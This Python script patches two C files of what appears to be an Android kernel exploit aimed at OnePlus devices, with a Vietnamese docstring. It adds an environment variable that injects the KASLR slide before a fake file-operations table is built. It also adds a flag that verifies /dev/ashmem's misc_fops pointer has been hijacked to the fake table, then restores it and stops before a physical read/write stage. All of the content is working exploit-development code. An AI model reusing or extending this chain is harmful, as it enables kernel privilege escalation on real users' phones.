#!/usr/bin/env python3
"""patch_slide_env.py

(A) CHỐT KASLR SLIDE — hai thứ, đều là cờ (không đổi hành vi mặc định):

1) main.c : env SLIDE=0x… -> kaslr_base = KIMAGE_TEXT_BASE + slide; kaslr_done=1
   đặt TRƯỚC prepare_skb_payload() (tức trước mọi text_addr() của bảng fops giả).
   slide = runtime base - KIMAGE_TEXT_BASE = "Kernel Offset" + TEXT_OFFSET(0x80000).
   Bằng chứng: Image header text_offset=0x80000; mọi panic cho slide == KO+0x80000
   (BAN_GIAO §21.2).  Khi SLIDE được set thì bỏ qua slide_leak_kernel_base()
   (vòng tròn: nó cần fake fops đã chạy).

2) fops.c : env CFI_STOP_VERIFY=1 -> try_cfi_stage() dừng NGAY sau khi xác nhận
   redirect (misc_fops == fake_fops), KHÔI PHỤC fops gốc rồi return.  Dùng để
   kiểm chứng (A) mà không rơi vào physrw (PIPE_* còn là hằng 5.x — việc B).
"""
import os

CORE = "/root/ghostlock/ghostlock-oneplus/src/core"
M = os.path.join(CORE, "main.c")
F = os.path.join(CORE, "fops.c")

# ---------------------------------------------------------------- main.c ----
s = open(M).read()
assert "slide SLIDE env" not in s, "main.c already patched"

old = """  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;
"""
new = """  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  /* SLIDE env: inject the runtime KASLR slide directly.
   * slide = runtime base - KIMAGE_TEXT_BASE = (kernel "Kernel Offset") +
   * TEXT_OFFSET(0x80000), evidence in BAN_GIAO 21.2 / Image header
   * text_offset=0x80000.  Must be set BEFORE prepare_skb_payload() so every
   * text_addr() of the fake fops table is correct; leak_kernel_base() cannot
   * be used first (it needs a working fake fops -> circular). */
  int slide_env_set = 0;
  {
    const char *slide_env = getenv("SLIDE");
    if (slide_env && *slide_env) {
      uint64_t s = strtoull(slide_env, NULL, 0);
      kaslr_base = KIMAGE_TEXT_BASE + s;
      kaslr_slide = s;
      kaslr_done = 1;
      slide_env_set = 1;
      pr_success("slide SLIDE env base=%016llx slide=%016llx\\n",
                 (unsigned long long)kaslr_base, (unsigned long long)s);
      fsync(1);
    }
  }
"""
assert s.count(old) == 2, ("main.c kaslr block count", s.count(old))
s = s.replace(old, new)

old2 = """  if (!env_flag("NO_SLIDE", 0)) {
    if (slide_leak_kernel_base()) {
"""
new2 = """  if (!env_flag("NO_SLIDE", 0) && !slide_env_set) {
    if (slide_leak_kernel_base()) {
"""
assert s.count(old2) == 1, ("main.c leak guard count", s.count(old2))
s = s.replace(old2, new2)
open(M, "w").write(s)
print("main.c: SLIDE env injection")

# ---------------------------------------------------------------- fops.c ----
s = open(F).read()
assert "CFI_STOP_VERIFY" not in s, "fops.c already patched"

old3 = """  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
"""
new3 = """  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (env_flag("CFI_STOP_VERIFY", 0)) {
    /* Redirect verified: the fake fops are installed and working.  Restore the
     * original fops (so /dev/ashmem is not left dangling when we exit) and stop
     * before the physrw stage (whose PIPE_* offsets are still 5.x; task B). */
    uint64_t orig = canon_addr(ASHMEM_FOPS);
    ssize_t rr = configfs_write_once(fd, misc_fops, &orig, sizeof(orig));
    cfi_restore_ret = rr;
    pr_success("cfi STOP_VERIFY: fops_before=%016llx == fake_fops; restored "
               "orig=%016llx ret=%zd; stopping before physrw errno=%d\\n",
               (unsigned long long)before, (unsigned long long)orig, rr, errno);
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    SYSCHK(close(fd));
    return 1;
  }

  if (!restore_slide_boot_id(fd)) {
"""
assert s.count(old3) == 1, ("fops.c fops_before block count", s.count(old3))
s = s.replace(old3, new3)
open(F, "w").write(s)
print("fops.c: CFI_STOP_VERIFY")
